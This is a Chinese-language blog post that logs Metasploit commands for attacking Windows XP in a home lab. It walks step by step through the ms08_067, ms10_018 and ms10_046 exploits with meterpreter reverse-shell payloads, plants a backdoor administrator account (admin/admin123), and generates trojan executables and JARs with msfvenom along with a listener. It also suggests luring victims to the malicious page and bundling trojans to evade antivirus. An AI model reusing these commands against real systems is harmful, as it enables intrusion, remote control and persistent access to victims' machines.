---
title: Metasploit 的一些渗透命令记录
date: 2017-08-12 11:51:36
updated: 2017-08-12 11:51:36
tags: [网络安全]
categories: 其他
---
## 学黑客技术必备啊
### 简单来说，Metasploit是一款开源的安全漏洞检测工具，它本身附带一千多个渗透方式，和数百种攻击载荷
##### 来看看长啥样
![](1502693518259026341.png)

<!--more-->

## 下面记录关于windows xp 系统的一些漏洞。进行攻击的命令记录
### 测试环境：
#### 1、kali2.0
#### 2、windows xp pro

## 1、漏洞： ms08_067 
```shell
# 可通过命令来查看详情:search ms08_067
use exploit/windows/smb/ms08_067_netapi    //使用exploit
set payload windows/meterpreter/reverse_tcp  //设置攻击载荷
show options  	//查看参数配置
set RHOST 192.168.12.131   //设置目标主机ip ，我这里的目标主机为192.168.12.131
set LHOST 192.168.12.130   //设置本机ip ，我这里的本主机为192.168.12.130
set target 0        //这个设置自动
run  //开始攻击
# 获取到反弹的shell
shell   //进入对方电脑的终端
```
## 2、漏洞 ms10_018（浏览器提权）
```shell
# 同样的我们看看这个漏洞(搜索)：search ms10_018
use exploit/windows/browser/ms10_018_ie_behaviors    //使用exploit
set payload windows/meterpreter/reverse_tcp  //设置攻击载荷
show options  	//查看参数配置
set SRVHOST 192.168.12.130   //设置服务器主机ip ，我这里的目标主机为192.168.12.130
set LHOST 192.168.12.130   //设置本机ip ，我这里的本主机为192.168.12.130
set URIPATH test        //这个设置项目名为test
exploit  //开始渗透		
# 等待目标访问我们的网页，或者引诱目标访问我们的网页
# 获取到session(当出现类似： Successfully migrated to services.exe (680) 这样就是成功了)
sessions -i //查看 session
session -i 1 //选择id ，1就是id
# 获得shell
# 可以在对方的系统上添加一个管理员权限：命令如下
net user admin admin123 /add //这条命令的意思是新建一个用户admin,密码为admin123
net localgroup administrators admin /add //这条命令的意思是吧admin 添加到管理员组
```

## 3、漏洞 ms10_046（快捷方式漏洞）
```shell
# 同样的我们看看这个漏洞(搜索)：search ms10_046
use exploit/windows/browser/ms10_046_shortcut_icon_dllloader    //使用exploit
set payload windows/meterpreter/reverse_tcp  //设置攻击载荷
show options  	//查看参数配置
set SRVHOST 192.168.12.130   //设置服务器主机ip ，我这里的目标主机为192.168.12.130
set LHOST 192.168.12.130   //设置本机ip ，我这里的本主机为192.168.12.130
run        //开始渗透	
exploit	
# 等待目标访问我们的网页，或者引诱目标访问我们的网页(或者http://192.168.12.130:80/) 或者文件夹里访问：\\192.168.12.130\ILSSNnFb\ 
# 获取到session(当出现类似： Successfully migrated to services.exe (680) 这样就是成功了)
sessions -l //查看 session
session -i 1 //选择id ，1就是id
# 获得shell
# 可以在对方的系统上添加一个管理员权限：命令如下
net user admin admin123 /add //这条命令的意思是新建一个用户admin,密码为admin123
net localgroup administrators admin /add //这条命令的意思是吧admin 添加到管理员组
```

> #### 当我们没有发现漏洞的时候，我们就可以利用木马进行攻击了。但是现在的杀毒软件挺成熟的，普通生成的木马容易被发现，所有我们要做的事学会免杀，或者可以和其他软件进行捆绑。
> #### 免杀是一门高级的学问，在这里就不再讲述了，下面介绍的是用msfvenom 生成木马。

## 4、木马生成
```shell
# 当没有漏洞的时候，就可以使用木马来进行渗透了。
# 利用 msfvenom 工具生成木马
# -p 是设置payload, -f 是生成文件的格式 /root/muma.exe 是生成的文件名
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.12.130 LPORT=1234 -f exe > /root/muma.exe 	
# 上面是exe 的格式，java的格式如下：
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.12.130 LPORT=1234 -f jar > /root/muma.jar
# 如果是java 下面的set payload 也要改成和生成文件的payload 的一致。
# 打开msfconsole进行监听
use exploit/multi/handler			//
set payload windows/meterpreter/reverse_tcp  //设置载荷
set LHOST 192.168.12.130   //设置本机地址
set LPORT 1234   //设置监听端口，这个和上面用msfvenom 设置的端口一致
run  //开始渗透
获取到shell
```

> 说下废话，哥当年选计算机专业，就是感觉黑客很牛掰，黑着黑那的很神奇。但是现在发现和我想的不太一样呢。没想到计算机行业有那么多分类。
> 黑客技术很高深，要好好学，研究才行，哥只是个业余的。
> 
